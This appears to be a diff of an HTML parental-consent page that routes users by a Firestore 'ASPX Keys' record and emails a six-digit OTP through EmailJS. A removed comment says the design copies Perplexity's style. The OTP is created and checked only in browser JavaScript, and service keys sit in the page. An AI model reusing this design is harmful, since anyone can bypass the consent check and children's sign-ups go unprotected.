@@ -3,10 +3,20 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Verification</title>
+    <title>Verific bation</title>
+    
+    <!-- EmailJS SDK -->
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <script type="text/javascript">
+        (function() {
+            // Initialize EmailJS with your Public Key
+            emailjs.init("Yr9MutUoHOEONnFgn");
+        })();
+    </script>
+
     <style>
         body {
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
             display: flex;
             justify-content: center;
             align-items: center;
@@ -18,27 +28,14 @@
 
         .container {
             text-align: center;
-            max-width: 400px;
             width: 100%;
+            max-width: 400px;
             padding: 20px;
-            display: none; /* Hidden by default until Firebase loads */
-        }
-
-        #loading-screen {
-            display: block;
-            font-size: 18px;
-            color: #666;
-        }
-
-        .icon {
-            width: 60px;
-            height: 60px;
-            margin-bottom: 20px;
+            display: none; /* Hidden by default, shown via JS */
         }
 
         h1 {
-            font-family: serif; /* Matches the Perplexity style in your image */
-            font-size: 32px;
+            font-size: 28px;
             margin-bottom: 10px;
             font-weight: normal;
         }
@@ -50,16 +47,17 @@
         }
 
         /* Email Input Styles */
-        input[type="email"] {
-            width: 90%;
-            padding: 12px;
-            margin-bottom: 20px;
+        .email-input {
+            width: 100%;
+            padding: 15px;
             border: 1px solid #ccc;
             border-radius: 8px;
             font-size: 16px;
+            box-sizing: border-box;
+            margin-bottom: 20px;
         }
 
-        /* OTP Box Styles */
+        /* OTP Input Styles */
         .otp-container {
             display: flex;
             justify-content: space-between;
@@ -69,89 +67,99 @@
         .otp-input {
             width: 45px;
             height: 55px;
-            border: 1px solid #ddd;
+            border: 1px solid #ccc;
             border-radius: 8px;
             text-align: center;
             font-size: 24px;
-            background-color: #fafafa;
+            background-color: #fcfcfc;
         }
-
+        
         .otp-input:focus {
             outline: none;
-            border-color: #333;
+            border-color: #888;
         }
 
         /* Button Styles */
-        button {
+        .btn {
             width: 100%;
-            padding: 14px;
-            background-color: #999590;
-            color: white;
+            padding: 15px;
             border: none;
             border-radius: 8px;
             font-size: 16px;
             cursor: pointer;
-            transition: background-color 0.3s;
+            transition: background 0.3s;
         }
 
-        button:hover {
-            background-color: #7a7672;
+        .btn-primary {
+            background-color: #8c8881; /* Matches the color in your screenshot */
+            color: white;
         }
 
-        button:disabled {
-            background-color: #cccccc;
+        .btn-primary:hover {
+            background-color: #75716a;
+        }
+
+        .btn:disabled {
+            background-color: #ccc;
             cursor: not-allowed;
         }
-    </style>
 
-    <!-- EmailJS SDK -->
-    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
-    <script type="text/javascript">
-        (function() {
-            emailjs.init("Yr9MutUoHOEONnFgn");
-        })();
-    </script>
+        #loading-screen {
+            display: block; /* Show loading initially */
+        }
+        
+        .error-msg {
+            color: red;
+            font-size: 14px;
+            margin-top: -15px;
+            margin-bottom: 15px;
+            display: none;
+        }
+    </style>
 </head>
 <body>
 
-    <!-- Loading Screen while checking Firebase -->
+    <!-- 1. Loading Screen -->
     <div id="loading-screen" class="container">
-        Processing your request... Please wait.
+        <h2>Please wait...</h2>
+        <p>Verifying account details.</p>
     </div>
 
-    <!-- Step 1: Ask for Parental Email (Only for Kids) -->
-    <div id="email-section" class="container">
+    <!-- 2. Email Collection Screen (For Kids) -->
+    <div id="email-screen" class="container">
         <h1>Parental Consent</h1>
-        <p>Please enter a parent or guardian's email address to continue.</p>
-        <input type="email" id="parent-email" placeholder="Enter parent's email" required>
-        <button id="send-email-btn" onclick="sendOTP()">Send One-Time Password</button>
+        <p>Please enter a parental email address to continue.</p>
+        <input type="email" id="parent-email" class="email-input" placeholder="parent@example.com" required>
+        <div id="email-error" class="error-msg">Please enter a valid email.</div>
+        <button id="send-otp-btn" class="btn btn-primary">Send OTP</button>
     </div>
 
-    <!-- Step 2: Verify OTP (Only for Kids) -->
-    <div id="otp-section" class="container">
-        <!-- SVG matching the paper plane icon in your image roughly -->
-        <svg class="icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">
+    <!-- 3. OTP Verification Screen (For Kids) -->
+    <div id="otp-screen" class="container">
+        <!-- SVG Icon from your screenshot approximation -->
+        <svg width="60" height="60" viewBox="0 0 24 24" fill="none" stroke="black" stroke-width="1" stroke-linecap="round" stroke-linejoin="round" style="margin-bottom:20px;">
             <circle cx="12" cy="12" r="10"></circle>
-            <path d="M12 8v4l3 3"></path>
+            <path d="M12 16v-4"></path>
+            <path d="M12 8h.01"></path>
             <path d="M15 9l-6 6"></path>
         </svg>
-        
         <h1>Check your email</h1>
-        <p>A temporary sign-in link/OTP has been sent to <br> <strong id="display-email"></strong></p>
+        <p id="otp-subtitle">A temporary sign-in link has been sent to</p>
         
         <div class="otp-container">
-            <input type="text" class="otp-input" maxlength="1" onkeyup="moveToNext(this, event)">
-            <input type="text" class="otp-input" maxlength="1" onkeyup="moveToNext(this, event)">
-            <input type="text" class="otp-input" maxlength="1" onkeyup="moveToNext(this, event)">
-            <input type="text" class="otp-input" maxlength="1" onkeyup="moveToNext(this, event)">
-            <input type="text" class="otp-input" maxlength="1" onkeyup="moveToNext(this, event)">
-            <input type="text" class="otp-input" maxlength="1" onkeyup="moveToNext(this, event)">
+            <input type="text" class="otp-input" maxlength="1" pattern="[0-9]">
+            <input type="text" class="otp-input" maxlength="1" pattern="[0-9]">
+            <input type="text" class="otp-input" maxlength="1" pattern="[0-9]">
+            <input type="text" class="otp-input" maxlength="1" pattern="[0-9]">
+            <input type="text" class="otp-input" maxlength="1" pattern="[0-9]">
+            <input type="text" class="otp-input" maxlength="1" pattern="[0-9]">
         </div>
+        <div id="otp-error" class="error-msg">Invalid OTP. Please try again.</div>
         
-        <button onclick="verifyOTP()">Confirm</button>
+        <button id="confirm-otp-btn" class="btn btn-primary">Confirm</button>
     </div>
 
-    <!-- Firebase Initialization and Logic -->
+    <!-- Firebase SDK Implementation (v9 Modular) -->
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.1/firebase-app.js";
         import { getFirestore, doc, getDoc, updateDoc } from "https://www.gstatic.com/firebasejs/10.8.1/firebase-firestore.js";
@@ -168,140 +176,158 @@
             measurementId: "G-6ZP1FPMKSJ"
         };
 
+        // Initialize Firebase
         const app = initializeApp(firebaseConfig);
         const db = getFirestore(app);
 
-        // Get session ID from URL
+        // UI Elements
+        const loadingScreen = document.getElementById('loading-screen');
+        const emailScreen = document.getElementById('email-screen');
+        const otpScreen = document.getElementById('otp-screen');
+        
+        // Variables
+        let generatedOTP = "";
+        let userEmail = "";
+        
+        // Get Session ID from URL
         const urlParams = new URLSearchParams(window.location.search);
         const sessionId = urlParams.get('session');
 
-        // Global variables for OTP logic
-        window.generatedOTP = "";
-        window.dbDocRef = null;
-        window.currentSessionId = sessionId;
+        if (!sessionId) {
+            loadingScreen.innerHTML = "<h2>Error</h2><p>No session ID found in URL.</p>";
+            throw new Error("No session ID");
+        }
 
-        async function processUser() {
-            if (!sessionId) {
-                document.getElementById('loading-screen').innerText = "Error: No session ID found in URL.";
-                return;
-            }
-
-            window.dbDocRef = doc(db, "ASPX Keys", sessionId);
-
+        // --- Main Logic Function ---
+        async function checkUserType() {
             try {
-                const docSnap = await getDoc(window.dbDocRef);
+                // Fetch document from ASPX Keys collection using session ID
+                const docRef = doc(db, "ASPX Keys", sessionId);
+                const docSnap = await getDoc(docRef);
 
                 if (docSnap.exists()) {
                     const data = docSnap.data();
-                    const userType = data.type; 
+                    const userType = data.type; // Assumes a 'type' field exists in DB
 
-                    if (userType === 'personal') {
-                        // Update family=no and redirect
-                        await updateDoc(window.dbDocRef, { family: "no" });
-                        window.location.href = `7.html?session=${sessionId}`;
-
-                    } else if (userType === 'busniess' || userType === 'business') {
-                        // Update family=workspace and redirect
-                        await updateDoc(window.dbDocRef, { family: "workspace" });
-                        window.location.href = `7.html?session=${sessionId}`;
-
-                    } else if (userType === 'kids') {
-                        // Show Email Input UI for kids
-                        document.getElementById('loading-screen').style.display = 'none';
-                        document.getElementById('email-section').style.display = 'block';
-                    } else {
-                        document.getElementById('loading-screen').innerText = "Unknown account type.";
+                    if (userType === "personal") {
+                        await updateDoc(docRef, { family: "no" });
+                        redirectTo7();
+                    } 
+                    else if (userType === "busniess" || userType === "business") {
+                        await updateDoc(docRef, { family: "workspace" });
+                        redirectTo7();
+                    } 
+                    else if (userType === "kids") {
+                        // Hide loading, show email collection screen
+                        loadingScreen.style.display = "none";
+                        emailScreen.style.display = "block";
+                    } 
+                    else {
+                        loadingScreen.innerHTML = "<h2>Error</h2><p>Unknown account type.</p>";
                     }
                 } else {
-                    document.getElementById('loading-screen').innerText = "Error: Session document not found in Database.";
+                    loadingScreen.innerHTML = "<h2>Error</h2><p>Session not found in database.</p>";
                 }
             } catch (error) {
-                console.error("Error fetching document:", error);
-                document.getElementById('loading-screen').innerText = "Error connecting to database.";
+                console.error("Error fetching data:", error);
+                loadingScreen.innerHTML = "<h2>Error</h2><p>Database connection failed.</p>";
             }
         }
 
-        // Run on page load
-        processUser();
+        // Execute main logic on load
+        checkUserType();
 
-        // --- EXPORTING FIRESTORE FUNCTIONS TO GLOBAL WINDOW FOR INLINE HTML CALLS ---
-        window.updateKidsDatabase = async function() {
-            try {
-                await updateDoc(window.dbDocRef, { family: "commited" }); // Using 'commited' as requested
-                window.location.href = `7.html?session=${window.currentSessionId}`;
-            } catch(e) {
-                console.error("Error updating doc", e);
-                alert("Failed to update database.");
-            }
-        }
-    </script>
-
-    <!-- EmailJS & OTP UI Logic -->
-    <script>
-        // Move focus to next OTP box automatically
-        function moveToNext(current, event) {
-            if (current.value.length === 1) {
-                let next = current.nextElementSibling;
-                if (next) next.focus();
-            }
-            if (event.key === "Backspace") {
-                let prev = current.previousElementSibling;
-                if (prev) prev.focus();
-            }
-        }
-
-        // Send OTP via EmailJS
-        function sendOTP() {
+        // --- KIDS FLOW: Send OTP Logic ---
+        document.getElementById('send-otp-btn').addEventListener('click', () => {
             const emailInput = document.getElementById('parent-email').value;
-            const btn = document.getElementById('send-email-btn');
+            const errorMsg = document.getElementById('email-error');
+            const btn = document.getElementById('send-otp-btn');
 
-            if (!emailInput.includes('@')) {
-                alert("Please enter a valid email.");
+            if (!emailInput || !emailInput.includes('@')) {
+                errorMsg.style.display = "block";
                 return;
             }
+            errorMsg.style.display = "none";
+            userEmail = emailInput;
+            
+            // Generate 6 digit OTP
+            generatedOTP = Math.floor(100000 + Math.random() * 900000).toString();
 
             btn.disabled = true;
             btn.innerText = "Sending...";
 
-            // Generate 6 digit OTP
-            window.generatedOTP = Math.floor(100000 + Math.random() * 900000).toString();
-
-            // Set parameters exactly as your EmailJS template expects them
+            // Send via EmailJS
             const templateParams = {
-                to_email: emailInput,
-                otp: window.generatedOTP 
+                to_email: userEmail,
+                otp: generatedOTP
             };
 
-            emailjs.send('service_1ij08zn', 'template_kxe5gjg', templateParams)
+            emailjs.send("service_63mnm5a", "template_qxz1wka", templateParams)
                 .then(function(response) {
-                    // Hide email section, show OTP section
-                    document.getElementById('email-section').style.display = 'none';
-                    document.getElementById('otp-section').style.display = 'block';
-                    document.getElementById('display-email').innerText = emailInput;
+                    // Success: Switch to OTP screen
+                    emailScreen.style.display = "none";
+                    otpScreen.style.display = "block";
+                    document.getElementById('otp-subtitle').innerText = `A temporary sign-in link has been sent to\n${userEmail}`;
                 }, function(error) {
-                    console.log('FAILED...', error);
-                    alert("Failed to send OTP. Check console for details.");
+                    console.error('FAILED...', error);
+                    errorMsg.innerText = "Failed to send email. Check API limit.";
+                    errorMsg.style.display = "block";
                     btn.disabled = false;
-                    btn.innerText = "Send One-Time Password";
+                    btn.innerText = "Send OTP";
                 });
-        }
+        });
 
-        // Verify OTP entered by user
-        function verifyOTP() {
-            let enteredOTP = "";
+        // --- KIDS FLOW: Verify OTP Logic ---
+        document.getElementById('confirm-otp-btn').addEventListener('click', async () => {
             const inputs = document.querySelectorAll('.otp-input');
+            let enteredOTP = "";
             inputs.forEach(input => enteredOTP += input.value);
+            
+            const errorMsg = document.getElementById('otp-error');
+            const btn = document.getElementById('confirm-otp-btn');
 
-            if (enteredOTP === window.generatedOTP) {
-                // Call the globally exposed Firebase function
-                window.updateKidsDatabase();
+            if (enteredOTP === generatedOTP) {
+                errorMsg.style.display = "none";
+                btn.disabled = true;
+                btn.innerText = "Verifying...";
+
+                try {
+                    // Update DB to commited
+                    const docRef = doc(db, "ASPX Keys", sessionId);
+                    await updateDoc(docRef, { family: "commited" });
+                    redirectTo7();
+                } catch (error) {
+                    errorMsg.innerText = "Error updating database.";
+                    errorMsg.style.display = "block";
+                    btn.disabled = false;
+                    btn.innerText = "Confirm";
+                }
             } else {
-                alert("Incorrect OTP. Please try again.");
-                // clear inputs
-                inputs.forEach(input => input.value = '');
-                inputs[0].focus();
+                errorMsg.style.display = "block";
             }
+        });
+
+        // --- Helper: Redirect Function ---
+        function redirectTo7() {
+            window.location.href = `7.html?session=${sessionId}`;
         }
+
+        // --- Helper: OTP Input Auto-Focus Logic ---
+        const otpInputs = document.querySelectorAll('.otp-input');
+        otpInputs.forEach((input, index) => {
+            input.addEventListener('keyup', (e) => {
+                if (e.key >= 0 && e.key <= 9) {
+                    if (index < otpInputs.length - 1) {
+                        otpInputs[index + 1].focus();
+                    }
+                } else if (e.key === 'Backspace') {
+                    if (index > 0 && input.value === "") {
+                        otpInputs[index - 1].focus();
+                    }
+                }
+            });
+        });
+
     </script>
 </body>
 </html>
